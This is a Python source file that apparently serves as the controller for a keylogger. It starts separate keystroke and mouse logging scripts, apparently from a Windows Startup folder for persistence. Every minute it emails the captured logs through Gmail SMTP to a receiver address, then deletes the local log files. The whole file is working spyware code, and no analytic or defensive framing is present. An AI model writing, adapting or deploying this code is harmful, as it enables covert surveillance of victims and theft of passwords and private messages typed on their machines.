import os
import subprocess
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText

# Folder and file paths
script_dir = os.path.dirname(os.path.abspath(__file__))
key_logger_folder = os.path.join(script_dir, "Key_logger")
log_dir = script_dir  # Logs are directly in the Startup folder
key_logger_script = os.path.join(
    key_logger_folder, "Python_scripts", "key_logger.py")
mouse_logger_script = os.path.join(
    key_logger_folder, "Python_scripts", "mouse_logger.py")

# Email credentials
sender_email = "sender's email"
# get it from app passwords in google->manage accounts
sender_password = "sender's password"
receiver_email = "receiver's email"

# Function to run Python scripts


def run_scripts():
    try:
        subprocess.Popen(["python", key_logger_script])
        subprocess.Popen(["python", mouse_logger_script])
    except Exception as e:
        print(f"Failed to run scripts: {e}")

# Function to send email with log files


def send_email():
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = "Log Files"

        # Define log file paths
        log_files = ["key_log.txt", "m_log.txt"]
        for log_file in log_files:
            log_path = os.path.join(log_dir, log_file)
            if os.path.exists(log_path):
                with open(log_path, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition",
                                    f"attachment; filename={log_file}")
                    msg.attach(part)
            else:
                msg.attach(MIMEText(f"{log_file} not found."))

        # Send email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())

        # Remove log files to save space
        for log_file in log_files:
            log_path = os.path.join(log_dir, log_file)
            if os.path.exists(log_path):
                os.remove(log_path)

    except Exception as e:
        print(f"Failed to send email: {e}")


# Main function to run scripts and send email every 1 minute
if __name__ == "__main__":
    run_scripts()
    while True:
        time.sleep(60)  # Wait for 1 minute
        send_email()
